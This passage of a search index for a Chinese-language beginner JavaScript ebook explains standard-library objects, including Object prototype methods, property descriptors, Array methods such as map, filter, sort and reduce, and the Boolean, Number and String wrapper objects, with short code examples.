\u83b7\u53d6\u5bf9\u8c61\u7684Prototype\u5bf9\u8c61\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_5","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<p>Object\u5b9e\u4f8b\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u516d\u4e2a</p> <pre><code>Object.prototype.valueOf();\n// \u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u503c(\u5bf9\u8c61\u672c\u8eab\uff0c\u5f88\u5c11\u4f7f\u7528)\n\nObject.prototype.toString()\n// \u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5f62\u5f0f(\u5f88\u5c11\u4f7f\u7528)\n\nObject.prototype.toLocaleString()\n// \u8fd4\u56de\u5f53\u524d\u5bf9\u8c61\u5bf9\u5e94\u7684\u672c\u5730\u5b57\u7b26\u4e32\u5f62\u5f0f(\u5224\u65ad\u5bf9\u8c61\u7684\u5177\u4f53\u7c7b\u578b [Object Array])\n\nObject.prototype.hasOwnProperty()\n// \u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u4e3a\u5f53\u524d\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u662f\u7ee7\u627f\u81ea\u539f\u578b\u5bf9\u8c61\u7684\u5c5e\u6027(\u5224\u65ad\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728\u4e8e\u5bf9\u8c61\u4e0a)\n\nObject.prototype.isPrototypeOf()\n// \u5224\u65ad\u5f53\u524d\u5bf9\u8c61\u662f\u5426\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\u7684\u539f\u578b(\u4e0d\u7528)\n\nObject.prototype.propertyIsEnumerable()\n// \u5224\u65ad\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u53ef\u679a\u4e3e(\u4e0d\u7528)\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#52","title":"5.2 \u5c5e\u6027\u63cf\u8ff0\u5bf9\u8c61","text":"<p>\u7b80\u5355\u8bf4\uff1a\u63cf\u8ff0\u5bf9\u8c61\u7684\u5c5e\u6027\u7684\u7279\u70b9\uff08\u5bf9\u8c61\u7684\u5c5e\u6027\u662f\u5426\u53ea\u8bfb\uff0c\u53ef\u67e5\u8be2\uff0c\u53ef\u66f4\u6539\uff0c\u53ef\u904d\u5386\u7b49\uff09</p> <pre><code>value: 123,\nwritable: true,\nenumberable: true,\nconfigurable: false,\nget: undefined,\nset: undefined\n</code></pre> <ul> <li>value \u5c5e\u6027\u7684\u503c</li> <li>writable \u5c5e\u6027\u53ef\u5426\u6539\u53d8</li> <li>Enumberable \u5c5e\u6027\u662f\u5426\u53ef\u904d\u5386\uff08if false, for-in and Object.keys will skip this propertity\uff09</li> <li>configurable \u5c5e\u6027\u53ef\u914d\u7f6e\uff08\u662f\u5426\u53ef\u4ee5\u5220\u9664\uff09</li> <li>get \u53d6\u503c\u51fd\u6570</li> <li>set \u8bbe\u7f6e\u51fd\u6570</li> </ul> <p>\u5229\u7528\u4e0a\u9762\u7684\u5c5e\u6027\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bbe\u7f6e\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\u662f\u53ea\u8bfb\u5c5e\u6027\uff1b\u8fd9\u90e8\u5206\u5c5e\u6027\u9879\u76ee\u4e2d\u5f88\u5c11\u7528\u5230\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#53-array","title":"5.3 Array \u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_6","title":"\u6784\u9020\u51fd\u6570","text":"<pre><code>let arr = new Array(5); // \u4f1a\u521b\u5efa\u4e00\u4e2a\u957f\u5ea6\u662f5\u7684\u7a7a\u6570\u7ec4\nconsole.log(arr[0]); // undefined \u6bcf\u4e00\u9879\u90fd\u662f\u7a7a\u7684\n\nlet arr2 = new Array(1, 2);\n// \u4f1a\u521b\u5efa\u4e00\u4e2a\u6570\u7ec4 [1, 2];\n</code></pre> <p>\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u6570\u7ec4\uff1a</p> <ul> <li> <p>\u5982\u679c\u4f20\u5165\u4e00\u4e2a\u6570\u503c\uff0c\u90a3\u4e48\u6570\u503c\u5c31\u662f\u6570\u7ec4\u7684\u957f\u5ea6\uff08\u5982\u679c\u6570\u503c\u662f\u5c0f\u6570\u5c31\u4f1a\u62a5\u9519\uff09\uff0c\u6bcf\u4e00\u9879\u90fd\u662f\u7a7a\u7684</p> </li> <li> <p>\u5982\u679c\u4f20\u5165\u591a\u4e2a\u53c2\u6570\uff0c\u5c31\u6784\u6210\u6570\u7ec4\u7684\u65b0\u7684\u9879</p> </li> <li> <p>\u5982\u679c\u4f20\u5165\u4e00\u4e2a\u6570\u7ec4\uff0c\u90a3\u4e48\u5c31\u8fd4\u56de\u548c\u539f\u59cb\u503c\u76f8\u540c\u7684\u6570\u7ec4</p> </li> </ul> <p>\u6240\u4ee5\uff0c\u4f7f\u7528\u6570\u7ec4\u5b57\u9762\u91cf\u521b\u5efa\u65b0\u6570\u7ec4\u662f\u5f88\u597d\u7684\u529e\u6cd5\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_7","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>\u7531\u4e8e typeof array === 'Object'\uff0c \u6240\u4ee5\u4f7f\u7528 Array.isArray(arr) =&gt; true \u5373\u53ef\u7cbe\u786e\u5224\u65ad\u6570\u7ec4\uff0c\u8fd9\u4e2a\u662f ES6 \u7684\u8bed\u6cd5\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_8","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<p>\u5e38\u7528 push pop shift unshift reverse slice splice</p> <p>join\uff08seperator\uff09 \u628a\u6570\u7ec4\u7528\u5206\u9694\u7b26\u94fe\u63a5\u5e76\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u3002\u5982\u679c\u67d0\u4e00\u9879\u662f undifined or null, \u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u7a7a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u6ca1\u6709\u5206\u9694\u7b26\uff0c\u9ed8\u8ba4\u4f7f\u7528\u9017\u53f7\u4f5c\u4e3a\u5206\u9694\u7b26\u3002\u901a\u8fc7 call \u65b9\u6cd5\uff0c\u53ef\u4ee5\u628a\u6570\u7ec4\u7684join\u4f7f\u7528\u5728\u5b57\u7b26\u4e32\u6216\u8005\u5bf9\u8c61\u4e0a\uff0c\u53ef\u4ee5\u6dfb\u52a0\u5b57\u7b26\u4e32\u7684\u5206\u9694\u7b26\uff0c\u6216\u8005\u5bf9\u8c61\u503c\u7684\u5206\u9694\u7b26\u3002</p> <pre><code>Array.prototype.join.call('hello', '&amp;');\n// h&amp;e&amp;l&amp;l&amp;o\n\nlet obj = {name: \"Mike\", age: '20'}\nArray.prototype.join.call(obj, '-');\n// 'Mike-20'\n</code></pre> <p>concat \u5c06\u591a\u4e2a\u6570\u7ec4\u8fde\u63a5\u6210\u65b0\u7684\u6570\u7ec4\uff0c\u8fd4\u56de\u503c\u662f\u65b0\u6570\u7ec4\uff0c\u4e0d\u6539\u53d8\u539f\u59cb\u503c\u3002\u5982\u679c\u4f20\u5165\u53c2\u6570\u662f\u591a\u4e2a\u6570\u503c\uff0c\u5c31\u628a\u6570\u503c\u52a0\u5165\u5230\u6570\u7ec4\u7684\u540e\u9762\uff1b\u5982\u679c\u4f20\u5165\u7684\u662f\u5f15\u7528\u5bf9\u8c61\uff0c\u90a3\u4e48\u5c31\u6d45\u62f7\u8d1d\u5bf9\u8c61\u7684\u503c\u3002</p> <p>sort \u6392\u5e8f\uff0c\u9ed8\u8ba4\u6309\u7167\u5b57\u7b26\u5b57\u5178\u7684\u4f4d\u7f6e\u8fdb\u884c\u6392\u5e8f\uff0c\u539f\u6570\u7ec4\u5c06\u4f1a\u88ab\u6539\u53d8\uff1b\u5982\u679c\u5e0c\u671b\u6309\u7167\u81ea\u5b9a\u4e49\u7684\u65b9\u5f0f\u6392\u5e8f\uff0c\u5c31\u5728\u540e\u9762\u52a0\u5165\u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684\u51fd\u6570\uff08\u53ef\u4ee5\u6bd4\u8f83\u4e00\u4e0b\u5192\u6ce1\u6392\u5e8f\u6cd5\u5feb\u901f\u6392\u5e8f\u6cd5\u548c\u8fd9\u91cc\u7684\u6392\u5e8f\u6cd5\u7684\u590d\u6742\u5ea6\uff09\u3002\u5982\u679c\u662f\u4e00\u4e2a\u6570\u7ec4\u4e2d\u662f\u5bf9\u8c61\uff0c\u7136\u540e\u5bf9\u4e8e\u5bf9\u8c61\u4e2d\u7684\u67d0\u4e2a\u5c5e\u6027\u8fdb\u884c\u6392\u5e8f\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6392\u5e8f\u6bd4\u4e0a\u9762\u4e24\u4e2a\u65b9\u6848\u66f4\u597d\u3002</p> <pre><code>array.sort(function(a, b) {\n  return a - b;\n});\n</code></pre> <p>map \u5c06\u51fd\u6570\u4e2d\u7684\u6bcf\u4e00\u9879\u6267\u884c\u67d0\u4e2a\u51fd\u6570\uff0c\u8fd4\u56de\u503c\u662f\u6267\u884c\u51fd\u6570\u540e\u7684\u65b0\u6570\u7ec4\u3002\u5982\u679c\u67d0\u4e00\u9879\u662f\u7a7a\uff0c\u90a3\u4e48\u4f1a\u8df3\u8fc7\u6574\u4e2a\u4f4d\u7f6e\uff1b\u5982\u679c\u67d0\u4e00\u9879\u662fundefined\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u51fd\u6570\u3002\u8fd9\u4e2a\u51fd\u6570\u5f88\u597d\u4f7f\u7528\uff0c\u53ef\u4ee5\u628a\u4e00\u4e2a\u51fd\u6570\u8fdb\u884c\u8f6c\u6362\u64cd\u4f5c\u3002</p> <pre><code>array.map(function(item, index, array) =&gt; {\n  return sth;\n});\n</code></pre> <p>forEach \u4f1a\u5bf9\u51fd\u6570\u7684\u6bcf\u4e00\u9879\u6267\u884c\u51fd\u6570\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\u3002\u5982\u679c\u4ec5\u4ec5\u60f3\u5bf9\u4e8e\u51fd\u6570\u7684\u6bcf\u4e00\u9879\u6267\u884c\u4e00\u4e2a\u64cd\u4f5c\uff0c\u4e0d\u9700\u8981\u83b7\u53d6\u65b0\u7684\u6570\u7ec4\uff0c\u5c31\u4f7f\u7528\u8fd9\u4e2a\u51fd\u6570\u3002map\u51fd\u6570\u4f7f\u7528\u8f83\u591a\u3002\u540c\u7406\uff0cforEach \u51fd\u6570\u4f1a\u8df3\u8fc7\u7a7a\u4f4d\uff0c\u4e0d\u4f1a\u8df3\u8fc7 undefined\u3002</p> <p>filter \u51fd\u6570\uff1a\u5c06\u51fd\u6570\u7684\u6bcf\u4e00\u9879\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5982\u679c\u662f\u771f\u5b9e\u5c31\u8fd4\u56de\uff0c\u8fd4\u56de\u503c\u662f\u6ee1\u8db3\u8fc7\u6ee4\u6761\u4ef6\u7684\u65b0\u6570\u7ec4\u3002</p> <pre><code>let newArr = array.filter(function(item, index, array) {\n  return (item &gt; 10);\n});\n</code></pre> <p>some \u5224\u65ad\u6570\u7ec4\u7684\u6bcf\u4e00\u9879\uff0c\u5982\u679c\u6709\u4e00\u9879\u6ee1\u8db3\u6761\u4ef6\uff0c\u90a3\u4e48\u8fd4\u56de\u771f\uff0c\u5982\u679c\u5168\u4e0d\u6ee1\u8db3\u6761\u4ef6\u8fd4\u56de\u5047\u3002\u5982\u679c\u662f\u7a7a\u6570\u7ec4\uff0c\u5c31\u8fd4\u56de\u5047\u3002</p> <p>every \u5224\u65ad\u6570\u7ec4\u7684\u5168\u90e8\uff0c\u5982\u679c\u5168\u90e8\u6ee1\u8db3\u6761\u4ef6\u5c31\u8fd4\u56de\u771f\uff0c\u5426\u5219\u8fd4\u56de\u5047\u3002\u5982\u679c\u4f20\u5165\u53c2\u6570\u662f\u7a7a\u6570\u7ec4\uff0c\u5c31\u8fd4\u56de\u771f\uff08\u6ce8\u610f\u8fd9\u4e2a\u60c5\u51b5\uff01\uff01\uff01\uff09</p> <p>reduce \u548c reduceRight \u4ece\u5de6\u5411\u53f3\u6216\u8005\u4ece\u53f3\u5411\u5de6\u4f9d\u6b21\u5904\u7406\u6570\u7ec4\u7684\u6bcf\u4e00\u9879\uff0c\u5c06\u6bcf\u4e00\u9879\u76f8\u4e58\u6216\u8005\u76f8\u52a0\u3002</p> <pre><code>array.reduce(function(a, b){\n  return a + b\n}, 10);\n// \u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u521d\u59cb\u503c\uff0c\u4ece10\u5f00\u59cb\u52a0\uff1b\n// \u5982\u679c\u662f\u7a7a\u6570\u7ec4\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5f88\u91cd\u8981\uff0c\u907f\u514d\u51fa\u9519 Reduce of empty array with no initial value\n</code></pre> <p>\u5982\u679c\u662f\u52a0\u6cd5\u6216\u8005\u4e58\u6cd5\uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u76f8\u540c\uff0c\u5982\u679c\u662f\u51cf\u6cd5\u6216\u8005\u9664\u6cd5\uff0c\u5c31\u4f1a\u5f97\u5230\u4e0d\u540c\u7684\u503c\u3002\u5f53\u7136\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u627e\u51fa\u6570\u7ec4\u7684\u6700\u5927\u503c\u6700\u5c0f\u503c\uff0c\u6216\u8005\u627e\u5230\u5b57\u7b26\u4e32\u6700\u957f\u7684\u503c\u3002</p> <p>indexOf lastIndexOf \u53ef\u4ee5\u5224\u65ad\u67d0\u4e2a\u5b57\u7b26\u4e32\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u4f46\u662f\u4e0d\u80fd\u5224\u65adNaN\uff08\u56e0\u4e3a NaN \uff01== NaN\uff09\u3002</p> <p>\u4e0d\u5e38\u7528</p> <p>toString \u5c06\u6570\u7ec4\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\u8f93\u51fa</p> <p>valueOf \u8fd4\u56de\u6570\u7ec4\u672c\u8eab</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_9","title":"\u94fe\u5f0f\u4f7f\u7528","text":"<p>\u5982\u679c\u4e00\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6570\u7ec4\uff0c\u53ef\u4ee5\u7ee7\u7eed\u8fdb\u884c\u64cd\u4f5c\u3002</p> <pre><code>var users = [\n  {name: 'tom', email: 'tom@example.com'},\n  {name: 'peter', email: 'peter@example.com'}\n];\n\nusers\n.map(function (user) {\n  return user.email;\n})\n.filter(function (email) {\n  return /^t/.test(email);\n})\n.forEach(function (email) {\n  console.log(email);\n});\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#54","title":"5.4 \u5305\u88c5\u5bf9\u8c61","text":"<p>\u5b9e\u9645\u9879\u76ee\u4e2d\u5f88\u5c11\u4f7f\u7528 https://wangdoc.com/javascript/stdlib/wrapper.html</p> <p>\u5305\u88c5\u5bf9\u8c61\uff1a\u5b57\u7b26\u4e32\u3001\u5e03\u5c14\u503c\u3001\u6570\u503c\u5bf9\u5e94\u7684\u5bf9\u8c61\u5c31\u662f\u5305\u88c5\u5bf9\u8c61\u3002\u76ee\u7684\uff1aJS\u662f\u57fa\u4e8e\u5bf9\u8c61\u7684\uff0c\u6240\u4ee5\u8fd9\u4e9b\u6570\u636e\u7c7b\u578b\u53ef\u4ee5\u8868\u73b0\u6210\u5bf9\u8c61\u6a21\u5f0f\u3002</p> <p>\u5982\u679c\u628a Number Boolean String \u4f5c\u4e3a\u666e\u901a\u51fd\u6570\uff0c\u53ef\u4ee5\u628a\u4e00\u4e2a\u53c2\u6570\u8f6c\u5316\u6210\u7b80\u5355\u5bf9\u8c61\uff0c\u5982\u679c\u4f5c\u4e3a\u6784\u9020\u51fd\u6570 new Number(parameter) \u5c31\u4f1a\u8f6c\u5316\u6210\u5305\u88c5\u5bf9\u8c61\uff0c\u5305\u88c5\u5bf9\u8c61\u548c\u539f\u59cb\u7684\u6570\u503c\u4e0d\u5168\u7b49\u3002</p> <pre><code>let num1 = new Number(1); \n// num1 !== 1 \u6784\u9020\u51fd\u6570\uff0cnum1\u662f\u5305\u88c5\u5bf9\u8c61\n\nlet num2 = Number('2');\n// \u7b80\u5355\u51fd\u6570\uff0cnum2 \u662f\u6570\u503c\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_10","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>valueOf \u83b7\u53d6\u5305\u88c5\u5bf9\u8c61\u7684\u539f\u59cb\u7b80\u5355\u7c7b\u578b\u503c</p> <p>toString \u5c06\u5305\u88c5\u5bf9\u8c61\u8f6c\u6362\u6210\u4e3a\u5b57\u7b26\u4e32</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_11","title":"\u81ea\u52a8\u8f6c\u6362","text":"<p>\u5305\u88c5\u5bf9\u8c61\u548c\u539f\u59cb\u7b80\u5355\u7c7b\u578b\u7684\u81ea\u52a8\u8f6c\u6362\uff1a\u4e00\u4e2a\u5b57\u7b26\u4e32\u5177\u6709 length \u7684\u5c5e\u6027\uff0c\u5b9e\u9645\u4e0a\u5b57\u7b26\u4e32\u4e0d\u5177\u6709\u8fd9\u4e2a\u5c5e\u6027\uff08\u5bf9\u8c61\u624d\u5177\u6709\u5c5e\u6027\uff09\uff0cJS\u5185\u90e8\u4f1a\u9996\u5148\u5c06\u5b57\u7b26\u4e32\u8f6c\u5316\u6210\u5305\u88c5\u5bf9\u8c61\uff0c\u7136\u540e\u83b7\u53d6\u5bf9\u8c61\u7684\u957f\u5ea6\uff0c\u8fd4\u56de\u5bf9\u8c61\u7684\u957f\u5ea6\u540e\uff0c\u5c06\u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\u8f6c\u6362\u6210\u539f\u59cb\u7684\u6570\u503c\u3002 \u5982\u679c\u7ed9\u4e00\u4e2a\u5b57\u7b26\u4e32\u624b\u52a8\u6dfb\u52a0\u5c5e\u6027\uff0c\u90a3\u4e48\u4f1a\u8f6c\u5316\u6210\u5305\u88c5\u5bf9\u8c61\uff0c\u8fd9\u65f6\u5019\u4e0d\u62a5\u9519\u3002\u5982\u679c\u4f7f\u7528\u70b9\u8bed\u6cd5\u83b7\u53d6\u5b57\u7b26\u4e32\u7684\u67d0\u4e2a\u5c5e\u6027\uff0c\u5305\u88c5\u5bf9\u8c61\u5df2\u7ecf\u81ea\u52a8\u8f6c\u6362\u6210\u7b80\u5355\u7c7b\u578b\uff0c\u8fd9\u4e2a\u5c5e\u6027\u7684\u503c\u5c31\u662f undefined.</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_12","title":"\u81ea\u5b9a\u4e49\u65b9\u6cd5","text":"<p>\u7ed9\u6784\u9020\u51fd\u6570\u7684\u539f\u578b\u94fe\u52a0\u4e0a\u81ea\u5b9a\u4e49\u65b9\u6cd5\uff0c\u90a3\u4e48\u5305\u88c5\u5bf9\u8c61\u53ef\u4ee5\u76f4\u63a5\u8c03\u7528\u8fd9\u4e9b\u65b9\u6cd5</p> <pre><code>String.prototype.double = function() {\n  return this.valueOf() + this.valueOf();\n}\n// String \u5305\u88c5\u5bf9\u8c61\u5177\u6709\u81ea\u5b9a\u4e49\u7684double\u65b9\u6cd5\n'abc'.double();\n// \u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u5305\u88c5\u5bf9\u8c61\uff0c\u7136\u540e\u53bb\u539f\u578b\u94fe\u4e0a\u67e5\u627e\u8fd9\u4e2adouble\u65b9\u6cd5\uff0c\u5e76\u6267\u884c\n</code></pre> <p>\u4e0b\u9762\u4ecb\u7ecd\u4e09\u4e2a\u5305\u88c5\u5bf9\u8c61</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#55-boolean","title":"5.5 Boolean \u5305\u88c5\u5bf9\u8c61","text":"<p>Boolean \u4f5c\u4e3a\u666e\u901a\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u53c2\u6570\u8f6c\u6362\u6210\u5e03\u5c14\u503c\uff0c\u53ea\u6709\u4e94\u4e2a\u53ef\u4ee5\u8f6c\u6362\u6210 false \u7684\u60c5\u51b5\uff0cundefined, null, false, 0, NaN\u3002\u5176\u4ed6\u7684\u90fd\u662ftrue\uff0c\u4f8b\u5982'false', [], {}, /foo/, function(){} \u90fd\u662f true\u3002\u4f5c\u4e3a\u7b80\u5355\u51fd\u6570\uff0cBoolean \u7b49\u4e8e!! \u8fd0\u7b97\u7b26\uff0c\u901a\u5e38\u4f7f\u7528 !! \u8f6c\u6362\u6210\u5e03\u5c14\u503c\u3002</p> <p>Boolean \u4f5c\u4e3a\u6784\u9020\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u4e00\u4e2a\u53c2\u6570\u8f6c\u6362\u6210\u5e03\u5c14\u503c\u5305\u88c5\u5bf9\u8c61 new Boolean()\uff0c\u4f7f\u7528 valueOf() \u53ef\u4ee5\u83b7\u53d6\u539f\u59cb\u7684\u503c\u3002\u5bf9\u4e8e false \u548c null \uff0c\u4f7f\u7528\u6784\u9020\u51fd\u6570\u8f6c\u6362\u6210\u5bf9\u8c61\u540e\uff0c\u4ed6\u4eec\u7684\u503c\u662f true\u3002\u8fd9\u4e24\u4e2a\u7279\u4f8b\u5728\u666e\u901a\u51fd\u6570\u548c\u6784\u9020\u51fd\u6570\u83b7\u5f97\u7684\u7ed3\u679c\u662f\u4e0d\u540c\u7684\u3002</p> <p>\u6240\u4ee5\uff0c\u901a\u5e38\u4f5c\u4e3a\u666e\u901a\u51fd\u6570\u4f7f\u7528\uff08\u76f4\u63a5\u4f7f\u7528 !! \u8fdb\u884c\u8f6c\u6362\uff09\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#56-number","title":"5.6 Number \u5305\u88c5\u5bf9\u8c61","text":"<p>Number \u5bf9\u8c61\u53ef\u4ee5\u5f53\u505a\u666e\u901a\u51fd\u6570\uff08\u5de5\u5177\u51fd\u6570\uff09\u6216\u8005\u6784\u9020\u51fd\u6570\u4f7f\u7528\u3002</p> <p>Number \u5305\u88c5\u5bf9\u8c61\u5177\u6709\u5f88\u591a\u5b9e\u4f8b\u65b9\u6cd5\uff1atoString, toFixed .toExponential \uff0ctoPrecision\u628a\u6570\u503c\u5bf9\u8c61\u8f6c\u6362\u6210\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u6574\u6570\u3001\u5c0f\u6570\u3001\u79d1\u5b66\u8ba1\u6570\u6cd5\u3001\u7cbe\u5ea6\u6570\u636e\u3002\u4e3b\u8981\u4f5c\u7528\u5c31\u662f\uff0c\u5982\u679c\u540e\u7aef\u7ed9\u4e86\u4e00\u4e2a\u503c\uff0c\u5728\u524d\u7aef\u754c\u9762\u9700\u8981\u663e\u793a\u51e0\u4f4d\u5c0f\u6570\uff0c\u6216\u8005\u663e\u793a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u9996\u5148\u8f6c\u6362\u6210\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u5728\u754c\u9762\u4e0a\u6e32\u67d3\u8fd9\u4e2a\u503c\u3002</p> <p>\u540c\u7406\uff0cNumber \u5bf9\u8c61\u7684\u539f\u578b\u4e0a\u53ef\u4ee5\u7ed1\u5b9a\u81ea\u5b9a\u4e49\u65b9\u6cd5\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#57-string","title":"5.7 String \u5305\u88c5\u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_13","title":"\u6784\u9020\u51fd\u6570 \u5305\u88c5\u5bf9\u8c61","text":"<p><code>let strObj = new String();</code></p> <p>\u4f7f\u7528\u6784\u9020\u51fd\u6570\u53ef\u4ee5\u521b\u5efa\u5305\u88c5\u5bf9\u8c61\uff0c\u8f6c\u6362\u540e\u7684\u5305\u88c5\u5bf9\u8c61\u5177\u6709\u7c7b\u4f3c\u6570\u7ec4\u7684\u5c5e\u6027\uff1a\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u4e0b\u6807\u83b7\u53d6\u5bf9\u5e94\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u53ef\u4ee5length\u83b7\u53d6\u5bf9\u5e94\u7684\u957f\u5ea6\u3002\u5177\u6709valueOf\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u8f6c\u6362\u6210\u539f\u59cb\u7684\u503c\u3002</p> <p>\u5de5\u5177\u51fd\u6570=&gt;\u666e\u901a\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f6c\u6362\u6210\u5b57\u7b26\u4e32</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_14","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>fromCharCode \u53ef\u4ee5\u5c06\u5b57\u7b26\u4e32\u4ee3\u7801\u8f6c\u6362\u6210\u5b57\u7b26\u4e32 <code>String.fromCharCode(104, 101, 108, 108, 111)</code> \u5f88\u5c11\u4f7f\u7528</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_15","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<ul> <li>length \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff1a\u5982\u679c\u67d0\u4e2a\u4f4d\u7f6e\u662f\u7a7a\u5b57\u7b26\uff0c\u90a3\u4e48\u4e5f\u8ba1\u7b97\u957f\u5ea6\u3002\u201cabc   \u201d\u7684\u957f\u5ea6\u662f6\uff1b</li> <li>charAt charCodeAt \u8fd4\u56de\u5b57\u7b26\u4e32\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5b57\u7b26\u6216\u8005\u5b57\u7b26\u7801\uff08\u76f4\u63a5\u53ef\u4ee5\u901a\u8fc7\u4e0b\u6807\u5c5e\u6027\u83b7\u53d6\uff09</li> <li>concat \u8fde\u63a5\u5b57\u7b26\u4e32\uff0c\u4e0d\u4f1a\u6539\u53d8\u539f\u59cb\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u53c2\u6570\u4e0d\u662f\u5b57\u7b26\u4e32\uff0c\u9996\u5148\u628a\u6bcf\u4e2a\u53c2\u6570\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u62fc\u63a5\u3002\u5982\u679c\u5168\u90e8\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u4e0d\u9700\u8981\u8f6c\u6362\uff0c\u76f4\u63a5\u4f7f\u7528\u52a0\u53f7\u5373\u53ef\u3002\u5982\u679c\u53c2\u6570\u662f\u6570\u503c\u5e03\u5c14\u503c\u548c\u5b57\u7b26\u4e32\u6df7\u5408\uff0c\u4f7f\u7528concat\u62fc\u63a5\u5b57\u7b26\u4e32\u66f4\u597d\u3002</li> <li>slice \u5207\u53bb\u4e00\u6bb5\u5b57\u7b26\u4e32\uff0c\u4f7f\u7528\u5f88\u591a\uff0c\u89c4\u8303\u7c7b\u4f3c\u6570\u7ec4\u3002substring\u65b9\u6cd5\u7c7b\u4f3cslice\uff0c\u4f46\u662f\u6709\u95ee\u9898\uff0c\u6240\u4ee5\u4f18\u5148\u4f7f\u7528slice\u3002</li> <li>substr \u5207\u53bb\u4e00\u6bb5\u5b57\u7b26\u4e32\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u4f4d\u7f6e\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5207\u7684\u957f\u5ea6\uff08\u548cslice\u4e0d\u540c\uff09\u3002\u5982\u679c\u4e24\u4e2a\u90fd\u662f\u4f4d\u7f6e\uff08str.indexOf\uff09\uff0c\u4f7f\u7528slice\u66f4\u597d\uff0c\u5982\u679c\u786e\u5b9a\u5207\u53bb\u7684\u957f\u5ea6\uff0c\u90a3\u4e48\u4f7f\u7528substr\u66f4\u597d\u3002</li> <li>indexOf()/ lastIndexOf() \u83b7\u53d6\u5b57\u7b26\u51fa\u73b0\u7684\u4f4d\u7f6e</li> <li>trim \u5220\u9664\u5b57\u7b26\u4e32\u672b\u5c3e\u7684\u7a7a\u683c \u4e0d\u6539\u53d8\u539f\u59cb\u5b57\u7b26\u4e32\uff0c\u672b\u5c3e\u7684\u56de\u8f66\u6362\u884c\u5236\u8868\u7b26\u90fd\u53ef\u4ee5\u5220\u9664\uff08\\n \\r \\t \\v\uff09</li> <li>toLowerCase-toUpperCase \u8f6c\u6362\u6210\u5927\u5199\u6216\u8005\u5c0f\u5199</li> <li>match('at') 